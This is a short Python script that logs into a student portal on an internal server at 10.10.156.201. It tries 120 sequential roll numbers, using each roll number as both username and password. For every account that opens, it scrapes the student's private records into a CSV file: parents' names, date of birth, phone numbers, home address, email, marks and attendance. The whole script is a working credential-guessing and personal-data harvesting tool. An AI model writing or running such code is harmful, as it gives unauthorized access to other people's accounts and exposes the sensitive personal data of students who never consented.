import re
from robobrowser import RoboBrowser
import csv


def extractor(container_a):
    inside=container_a.find_all('tr')
    sem_data=[]
    dummy=[]
    for one in inside:
        two=one.find_all('td')
        for every in two:
            dummy.append(every.text.strip())
        if len(dummy)!=0:
            sem_data.append(dummy)
        dummy=[]
    #print(sem_data)
    return sem_data

def extract_special(container_a):
    inside=container_a.find_all('tr')
    sem_data=[]
    dummy=[]
    for one in inside:
        two=one.find_all('td')
        for every in two:
            if every.text.strip()!='':
                dummy.append(every.text.strip())
        if len(dummy)!=0:
            sem_data.append(dummy)
        dummy=[]
   # print(sem_data) 
    return sem_data

def important(data):
    refine=[]
    for every in data:
        refine.append(every[-2:])

    return refine

var=1402713001
csv_ofile=open("student_data_IT_4.csv",'w',newline='')
writer = csv.writer(csv_ofile)
writer.writerow(['Name','Father','roll_no','student_no','branch','year','section','current_sem','DOB','category','hostler','Addmission_mod','contact','parent_contact','address','email','10th%','12th%','B_tech%','sem_1_marks','sem_1_attendance','sem_2_marks','sem_2_attendance','sem_3_marks','sem_3_attendance','sem_4_marks','sem_4_attendance','sem_5_marks','sem_5_attendance','sem_6_marks','sem_6_attendance','sem_7_marks','sem_7_attendance','sem_8_marks','sem_8_attendance'])

for i in range(120):
    br=RoboBrowser()
    br.open("http://10.10.156.201/login-student.php")
    form=br.get_form('password-form')
    form['username1'].value=var
    form['password'].value=str(var)
    br.submit_form(form)
    container=br.find_all('table')
    if len(container)!=0 and len(container)==6:
        row=[]
        row.append(extract_special(container[2]))
        row.append(extractor(container[3]))
        row.append(extract_special(container[4]))
            
        relevant=important(extractor(container[5]))
        row.append(relevant)
            
        flattened_list = [y for x in row for y in x]
        final = [y for x in flattened_list for y in x]
        
        writer.writerow(final)
    
    var+=1
   
csv_ofile.close()
